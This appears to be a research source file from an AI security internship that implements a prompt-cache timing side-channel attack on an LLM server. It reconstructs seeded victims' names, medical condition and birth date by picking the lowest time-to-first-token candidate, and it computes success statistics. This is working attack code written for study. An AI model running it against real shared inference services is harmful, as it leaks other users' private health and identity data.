"""
reconstructor.py — Token-by-Token Prompt Reconstructor (Scenario S2)
==========================================================
Strategy for small timing gaps (GB10 unified memory: ~2.5ms gap):
  Probe ALL candidates, pick the one with the LOWEST mean TTFT.
  This "argmin TTFT" approach is robust to sub-10ms gaps where a hard
  threshold classifier fails — the correct candidate still has the
  lowest latency even when the absolute gap is small.

Week 10 — Phase 1, Issue #9
AI Security Internship 2026 — ONT Lab / CNIT-PNTLab Pisa
Muhammad Hashim Mughal
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass
from typing import Optional

import numpy as np

from .attacker import CacheHitOracle
from .victim_seeder import (
    KNOWN_PREFIX,
    MEDICAL_CONDITIONS,
    FIRST_NAMES,
    LAST_NAMES,
)

logger = logging.getLogger(__name__)

# Suppress noisy httpx request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpx2").setLevel(logging.WARNING)

CONDITION_VOCAB: list[str] = MEDICAL_CONDITIONS

DOB_YEARS:  list[str] = [str(y) for y in range(1935, 2007)]
DOB_MONTHS: list[str] = [f"{m:02d}" for m in range(1, 13)]
DOB_DAYS:   list[str] = [f"{d:02d}" for d in range(1, 32)]


# ── Result types ───────────────────────────────────────────────────────────────

@dataclass
class FieldResult:
    field_name:      str
    ground_truth:    str
    recovered:       Optional[str]
    correct:         bool
    queries_used:    int
    hit_ttft_ms:     Optional[float]
    miss_ttft_ms:    Optional[float]
    timing_gap_ms:   Optional[float]


@dataclass
class VictimReconstructionResult:
    victim_id:           int
    ground_truth_fields: dict[str, str]
    field_results:       list[FieldResult]
    token_recovery_rate: float
    exact_match:         bool
    total_queries:       int
    arpt:                float
    wall_time_s:         float


@dataclass
class AggregateResults:
    n_victims:          int
    mean_trr:           float
    success_rate:       float
    mean_arpt:          float
    arpt_ci_95:         list[float]
    mean_timing_gap_ms: float
    mean_wall_time_s:   float


# ── Core reconstruction logic ──────────────────────────────────────────────────

def reconstruct_field(
    oracle:         CacheHitOracle,
    known_prefix:   str,
    candidates:     list[str],
    field_name:     str,
    separator:      str = "",
) -> FieldResult:
    """
    Probe ALL candidates and return the one with the lowest mean TTFT.

    This "argmin TTFT" strategy works for small timing gaps (e.g. 2.5 ms
    on GB10 unified memory) where a hard hit/miss threshold fails.
    The cached candidate still has measurably lower latency than misses
    even when the gap is sub-10 ms — we just need to probe everything
    and pick the minimum rather than threshold-classify each probe.

    All n_repeats * len(candidates) API calls are made, then the candidate
    with the lowest mean TTFT is selected as the recovered value.
    """
    queries_used = 0
    candidate_ttfts: dict[str, float] = {}

    logger.debug(
        "  Probing field '%s' (%d candidates) | prefix='...%s'",
        field_name, len(candidates), known_prefix[-25:],
    )

    for candidate in candidates:
        probe = known_prefix + separator + candidate
        _, mean_ms, std_ms = oracle.query(probe)
        queries_used += oracle.n_repeats
        candidate_ttfts[candidate] = mean_ms

        logger.debug(
            "    %-22s TTFT=%.2f±%.2f ms",
            repr(candidate), mean_ms, std_ms,
        )

    # Pick the candidate with the lowest mean TTFT — that's the cache hit
    best_candidate = min(candidate_ttfts, key=lambda c: candidate_ttfts[c])
    best_ttft_ms   = candidate_ttfts[best_candidate]

    # All others are misses
    miss_ttfts = [v for k, v in candidate_ttfts.items() if k != best_candidate]
    mean_miss  = float(np.mean(miss_ttfts)) if miss_ttfts else None
    gap_ms     = (mean_miss - best_ttft_ms) if mean_miss is not None else None

    logger.debug(
        "  → best='%s' TTFT=%.2f ms | mean_others=%.2f ms | gap=%.2f ms",
        best_candidate, best_ttft_ms,
        mean_miss or 0.0, gap_ms or 0.0,
    )

    return FieldResult(
        field_name    = field_name,
        ground_truth  = "",       # filled in by caller
        recovered     = best_candidate,
        correct       = False,    # filled in by caller
        queries_used  = queries_used,
        hit_ttft_ms   = best_ttft_ms,
        miss_ttft_ms  = mean_miss,
        timing_gap_ms = gap_ms,
    )


def reconstruct_victim_s2(
    oracle:       CacheHitOracle,
    victim_id:    int,
    ground_truth: dict[str, str],
) -> VictimReconstructionResult:
    """
    Full Scenario S2 reconstruction for one victim using argmin TTFT strategy.

    Step 1: Recover first_name from FIRST_NAMES vocabulary (50 candidates)
    Step 2: Recover last_name  from LAST_NAMES vocabulary  (50 candidates)
    Step 3: Recover condition  from CONDITION_VOCAB        (20 candidates)
    """
    t_start = time.perf_counter()
    oracle.reset_call_counter()

    logger.info("Reconstructing victim %d ...", victim_id)
    field_results: list[FieldResult] = []
    known_prefix = KNOWN_PREFIX

    # ── Step 1: first_name ────────────────────────────────────────────────────
    fr_first = reconstruct_field(oracle, known_prefix, FIRST_NAMES, "first_name")
    fr_first.ground_truth = ground_truth["first_name"]
    fr_first.correct      = fr_first.recovered == ground_truth["first_name"]
    field_results.append(fr_first)

    recovered_first = fr_first.recovered or "UNKNOWN"
    known_prefix   += recovered_first + " "
    logger.info(
        "  first_name: truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["first_name"], fr_first.recovered,
        "✓" if fr_first.correct else "✗", fr_first.queries_used,
    )

    # ── Step 2: last_name ─────────────────────────────────────────────────────
    fr_last = reconstruct_field(oracle, known_prefix, LAST_NAMES, "last_name")
    fr_last.ground_truth = ground_truth["last_name"]
    fr_last.correct      = fr_last.recovered == ground_truth["last_name"]
    field_results.append(fr_last)

    recovered_last = fr_last.recovered or "UNKNOWN"
    known_prefix  += recovered_last + ". DOB: " + ground_truth["dob"] + ". Condition: "
    logger.info(
        "  last_name : truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["last_name"], fr_last.recovered,
        "✓" if fr_last.correct else "✗", fr_last.queries_used,
    )

    # ── Step 3: condition ─────────────────────────────────────────────────────
    fr_cond = reconstruct_field(oracle, known_prefix, CONDITION_VOCAB, "condition")
    fr_cond.ground_truth = ground_truth["condition"]
    fr_cond.correct      = fr_cond.recovered == ground_truth["condition"]
    field_results.append(fr_cond)
    logger.info(
        "  condition : truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["condition"], fr_cond.recovered,
        "✓" if fr_cond.correct else "✗", fr_cond.queries_used,
    )

    # ── Aggregate ─────────────────────────────────────────────────────────────
    n_correct = sum(f.correct for f in field_results)
    n_fields  = len(field_results)
    trr       = n_correct / n_fields
    exact     = n_correct == n_fields
    total_q   = oracle.total_api_calls
    arpt      = total_q / n_fields if n_fields > 0 else 0.0
    wall_s    = time.perf_counter() - t_start

    logger.info(
        "  Victim %d done: TRR=%.2f | exact=%s | %d queries | %.1f s",
        victim_id, trr, exact, total_q, wall_s,
    )

    return VictimReconstructionResult(
        victim_id=victim_id,
        ground_truth_fields=ground_truth,
        field_results=field_results,
        token_recovery_rate=trr,
        exact_match=exact,
        total_queries=total_q,
        arpt=arpt,
        wall_time_s=wall_s,
    )


def reconstruct_dob(
    oracle:       CacheHitOracle,
    known_prefix: str,
) -> tuple[Optional[str], int]:
    """Structured year → month → day DOB reconstruction using argmin TTFT."""
    total_q = 0

    fr_year = reconstruct_field(oracle, known_prefix, DOB_YEARS, "dob_year")
    total_q += fr_year.queries_used
    if fr_year.recovered is None:
        return None, total_q

    year_prefix = known_prefix + fr_year.recovered + "-"
    fr_month = reconstruct_field(oracle, year_prefix, DOB_MONTHS, "dob_month")
    total_q += fr_month.queries_used
    if fr_month.recovered is None:
        return None, total_q

    month_prefix = year_prefix + fr_month.recovered + "-"
    fr_day = reconstruct_field(oracle, month_prefix, DOB_DAYS, "dob_day")
    total_q += fr_day.queries_used
    if fr_day.recovered is None:
        return None, total_q

    return f"{fr_year.recovered}-{fr_month.recovered}-{fr_day.recovered}", total_q


# ── Aggregate statistics ───────────────────────────────────────────────────────

def compute_aggregate(results: list[VictimReconstructionResult]) -> AggregateResults:
    if not results:
        return AggregateResults(0, 0.0, 0.0, 0.0, [0.0, 0.0], 0.0, 0.0)

    trrs       = [r.token_recovery_rate for r in results]
    successes  = [r.exact_match         for r in results]
    arpts      = [r.arpt                for r in results]
    gaps       = [f.timing_gap_ms for r in results
                  for f in r.field_results if f.timing_gap_ms is not None]
    wall_times = [r.wall_time_s for r in results]

    rng = np.random.default_rng(42)
    boot_means = [
        np.mean(rng.choice(arpts, size=len(arpts), replace=True))
        for _ in range(2_000)
    ]
    ci_lo = float(np.percentile(boot_means, 2.5))
    ci_hi = float(np.percentile(boot_means, 97.5))

    return AggregateResults(
        n_victims=len(results),
        mean_trr=float(np.mean(trrs)),
        success_rate=float(np.mean(successes)),
        mean_arpt=float(np.mean(arpts)),
        arpt_ci_95=[ci_lo, ci_hi],
        mean_timing_gap_ms=float(np.mean(gaps)) if gaps else 0.0,
        mean_wall_time_s=float(np.mean(wall_times)),
    )